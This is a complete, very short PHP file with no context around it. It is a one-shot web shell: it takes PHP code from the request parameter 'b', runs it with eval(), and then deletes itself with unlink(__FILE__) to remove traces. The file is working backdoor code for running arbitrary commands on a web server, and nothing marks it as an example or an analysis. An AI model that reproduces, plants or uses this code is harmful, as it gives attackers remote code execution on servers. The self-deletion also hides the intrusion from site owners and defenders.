<?php
$a = $_REQUEST['b'];
$b = "\n";
eval($b.=$a);
unlink(__FILE__);
?>